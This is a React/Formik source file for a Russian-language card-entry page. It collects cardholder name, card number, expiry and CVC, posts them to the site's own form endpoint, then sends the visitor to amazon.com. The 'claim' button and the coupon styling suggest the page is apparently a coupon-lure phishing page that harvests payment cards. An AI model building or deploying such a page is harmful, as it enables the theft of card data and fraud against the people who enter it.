import { Field, Form, Formik } from "formik";

import Mastercard from '../images/mastercard.svg'
import Visa from '../images/visa.svg'

export default function Payment() {
  function validateNumber(value) {
    let error = "";
    if (!value || value === 0) {
      error = "*Обязательно";
    } else if (String(value).length < 13) {
      error = "*Длина должна быть больше 13 цифр.";
    }
    return error;
  };
  
  function expDateValidate(value) {
    let error = "";
    if (!value) {
      error = "*Обязательно";
    }
    return error;
  };

  function cvcValidate(value) {
    let error = "";
    if (!value || value === 0) {
      error = "*Обязательно";
    } else if (String(value).length < 3) {
      error = "*Должен содержать 3 цифры";
    }
    return error;
  }
  
  const handleSubmit = (e) => {
    e.preventDefault()
    let formData = new FormData(e.target.closest('form'))
    fetch('/', {
      method: 'POST',
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData).toString()
    })
    .then(() => {
      window.location = 'https://www.amazon.com/'
    })
    .catch(error => console.log(error))
  }

  return (
    <main>
      <div className="payment">
        <h1>Введите данные вашей карты.</h1>
        <Formik
          initialValues={{
            isInitialValid: false,
            number: "",
            holder: "",
            month: "",
            year: "",
            CVC: ""
          }}
        >
          {({errors, touched, isValid, dirty, setValues, values}) => (
            <Form
              className='card__form'
              name="card"
              method="post"
              onSubmit={handleSubmit}
              autoComplete="off"
            >
              <Field type="hidden" name="form-name" value="card" />
              <div className="card__front">
                <Field
                  id='holder'
                  placeholder='Имя владельца'
                  name="holder"
                  type="text"
                />
                <div className="error__wrapper">
                  <Field
                    id='number'
                    placeholder='Номер карты'
                    name="number"
                    type="text"
                    maxLength="16"
                    onChange={e => {
                      const num = Number(e.target.value)
                        return isNaN(num) ? null : setValues({...values, number: e.target.value.replaceAll(' ', '')})
                    }}
                    validate={validateNumber}
                    />
                  {errors.number && touched.number && <div>{errors.number}</div>}
                </div>
                <div className="card__front__bottom">
                  <div className="error__wrapper">
                    <Field
                      id='month'
                      placeholder='Месяц'
                      name="month"
                      type="text"
                      maxLength="2"
                      validate={expDateValidate}
                      onChange={e => {
                        const num = Number(e.target.value)
                        return isNaN(num) ? null : setValues({...values, month: e.target.value.replaceAll(' ', '')})
                      }}
                    />
                    {errors.month && touched.month && <div>{errors.month}</div>}
                  </div>
                  <div className="error__wrapper">
                    <Field
                      id='year'
                      placeholder='Год'
                      name="year"
                      type="text"
                      maxLength="2"
                      validate={expDateValidate}
                      onChange={e => {
                        const num = Number(e.target.value)
                        return isNaN(num) ? null : setValues({...values, year: e.target.value.replaceAll(' ', '')})
                      }}
                    />
                    {errors.year && touched.year && <div>{errors.year}</div>}
                  </div>
                </div>
                <div className="card__available-methods">
                  <img src={Mastercard} alt="" />
                  <img src={Visa} alt="" />
                </div>
              </div>
              <div className="card__back">
                <div className="error__wrapper">
                  <Field
                    id='CVC'
                    placeholder='CVC'
                    name="CVC"
                    maxLength="3"
                    type="text"
                    validate={cvcValidate}
                    onChange={e => {
                      const num = Number(e.target.value)
                      return isNaN(num) ? null : setValues({...values, CVC: e.target.value.replaceAll(' ', '')})
                    }}
                  />
                  {errors.CVC && touched.CVC && <div>{errors.CVC}</div>}
                </div>
              </div>
              <button type='submit' className='coupon__signin' disabled={!(isValid && dirty)}>Забрать</button>
            </Form>
          )}
        </Formik> 
      </div>
    </main>
  )
}